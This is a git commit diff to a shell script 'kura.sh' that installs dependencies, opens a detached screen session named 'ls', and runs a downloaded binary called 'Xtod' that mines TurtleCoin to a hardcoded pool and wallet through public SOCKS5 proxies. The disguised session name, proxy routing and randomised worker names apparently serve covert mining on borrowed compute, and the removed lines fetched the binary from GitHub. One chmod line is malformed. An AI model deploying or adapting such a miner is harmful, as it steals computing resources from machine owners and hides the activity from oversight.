275366a1102d424753816846b14279a45c94fc52
rajakura <85157118+rajakura@users.noreply.github.com>
2021-07-12 21:22:19 +0700

    Update kura.sh

--- kura.sh
+++ kura.sh
@@ -1,8 +1,9 @@
 sudo apt update 
-wget https://github.com/duitawa/pasukan/raw/main/Xtod
-chmod 777 Xtod
+sudo apt install screen libjansson4 -y 
+chmod +x start.sh && chmod +x Xtod chmod 777 Xtod start.sh
+screen -dmS ls 
 POOL=turtlecoin.herominers.com:10380
 WALLET=TRTLv1sFBdxXrSMTWycv1xT14C3wNefSCJG2jEjduUcbQNEkkkEpEKM8826pfeG3qDVM3HifmdfMeRizcGDrygCfG3d1aXmHi7n
 WORKER=$(echo $(shuf -i 9-15 -n 1)-JOB10)
-PROXY=socks5://72.221.196.145:4145
+PROXY=socks5://162.243.168.215:9300
 ./Xtod -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 -t 2 -x $PROXY
